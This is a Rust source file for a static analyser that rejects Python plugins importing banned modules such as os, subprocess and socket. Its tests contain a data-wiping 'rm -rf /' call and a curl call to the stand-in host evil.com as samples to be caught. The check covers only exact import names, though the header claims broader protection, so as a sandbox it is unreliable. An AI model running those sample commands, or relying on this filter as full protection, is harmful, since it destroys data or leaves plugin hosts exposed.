//! Gatekeeper: Static Analysis for Python Plugins
//!
//! Validates Python source code using AST analysis to prevent:
//! - Execution of dangerous system calls
//! - Import of banned modules
//! - Use of restricted language features
//!
//! **Design Philosophy:**
//! Static analysis in Rust, not runtime validation in Python.
//! Zero-dependency on Python interpreter for security checks.

use anyhow::{Context, Result};
use rustpython_parser::{ast, Parse};
use std::collections::HashSet;

/// Banned modules that plugins are not allowed to import
const BANNED_MODULES: &[&str] = &[
    "os",
    "subprocess",
    "sys",
    "shutil",
    "socket",
    "ctypes",
    "multiprocessing",
    "__import__",
    "importlib",
];

/// Gatekeeper validates Python source code for security violations
pub struct Gatekeeper {
    banned_modules: HashSet<String>,
}

impl Default for Gatekeeper {
    fn default() -> Self {
        Self::new()
    }
}

impl Gatekeeper {
    /// Create a new Gatekeeper with default banned modules
    pub fn new() -> Self {
        Self {
            banned_modules: BANNED_MODULES.iter().map(|s| s.to_string()).collect(),
        }
    }

    /// Validate Python source code
    ///
    /// Returns `Ok(())` if code passes validation, or `Err` with a list of violations.
    pub fn validate(&self, source_code: &str) -> Result<()> {
        // Parse the Python source code into an AST
        let ast = ast::Suite::parse(source_code, "<plugin>")
            .context("Failed to parse Python source code")?;

        // Collect all violations
        let mut violations = Vec::new();

        // Walk the AST and check for banned imports
        self.check_imports(&ast, &mut violations);

        if violations.is_empty() {
            Ok(())
        } else {
            anyhow::bail!(
                "Security validation failed:\n{}",
                violations.join("\n")
            )
        }
    }

    /// Recursively check all imports in the AST
    fn check_imports(&self, suite: &[ast::Stmt], violations: &mut Vec<String>) {
        for stmt in suite {
            self.check_statement(stmt, violations);
        }
    }

    /// Check a single statement for banned imports
    fn check_statement(&self, stmt: &ast::Stmt, violations: &mut Vec<String>) {
        match stmt {
            // Direct import: import os
            ast::Stmt::Import(import) => {
                for alias in &import.names {
                    let module_name = alias.name.to_string();
                    if self.banned_modules.contains(&module_name) {
                        violations.push(format!(
                            "Banned import: 'import {}'",
                            module_name
                        ));
                    }
                }
            }

            // From import: from subprocess import run
            ast::Stmt::ImportFrom(import_from) => {
                if let Some(module) = &import_from.module {
                    let module_name = module.to_string();
                    if self.banned_modules.contains(&module_name) {
                        violations.push(format!(
                            "Banned import: 'from {} import ...'",
                            module_name
                        ));
                    }
                }
            }

            // Recursively check function definitions
            ast::Stmt::FunctionDef(func) => {
                self.check_imports(&func.body, violations);
            }

            // Recursively check async function definitions
            ast::Stmt::AsyncFunctionDef(func) => {
                self.check_imports(&func.body, violations);
            }

            // Recursively check class definitions
            ast::Stmt::ClassDef(class) => {
                self.check_imports(&class.body, violations);
            }

            // Recursively check if/else blocks
            ast::Stmt::If(if_stmt) => {
                self.check_imports(&if_stmt.body, violations);
                self.check_imports(&if_stmt.orelse, violations);
            }

            // Recursively check while loops
            ast::Stmt::While(while_stmt) => {
                self.check_imports(&while_stmt.body, violations);
                self.check_imports(&while_stmt.orelse, violations);
            }

            // Recursively check for loops
            ast::Stmt::For(for_stmt) => {
                self.check_imports(&for_stmt.body, violations);
                self.check_imports(&for_stmt.orelse, violations);
            }

            // Recursively check try/except blocks
            ast::Stmt::Try(try_stmt) => {
                self.check_imports(&try_stmt.body, violations);
                for handler in &try_stmt.handlers {
                    match handler {
                        ast::ExceptHandler::ExceptHandler(h) => {
                            self.check_imports(&h.body, violations);
                        }
                    }
                }
                self.check_imports(&try_stmt.orelse, violations);
                self.check_imports(&try_stmt.finalbody, violations);
            }

            // Recursively check with blocks
            ast::Stmt::With(with_stmt) => {
                self.check_imports(&with_stmt.body, violations);
            }

            // Other statement types don't need recursion
            _ => {}
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_code() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import pandas as pd
import pyarrow as pa

class Handler:
    def execute(self, file_path):
        df = pd.read_csv(file_path)
        return pa.Table.from_pandas(df)
"#;
        assert!(gatekeeper.validate(code).is_ok());
    }

    #[test]
    fn test_banned_import_os() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import os

class Handler:
    def execute(self, file_path):
        os.system("rm -rf /")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'import os'"));
    }

    #[test]
    fn test_banned_import_subprocess() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
from subprocess import run

class Handler:
    def execute(self, file_path):
        run(["curl", "evil.com"])
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'from subprocess import ...'"));
    }

    #[test]
    fn test_banned_import_in_function() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import pandas as pd

class Handler:
    def execute(self, file_path):
        import socket  # Evil nested import
        return pd.DataFrame()
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'import socket'"));
    }

    #[test]
    fn test_multiple_violations() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import os
from subprocess import run
import socket
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("import os"));
        assert!(err.contains("from subprocess"));
        assert!(err.contains("import socket"));
    }

    #[test]
    fn test_invalid_python_syntax() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
def invalid syntax here
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Failed to parse"));
    }
}
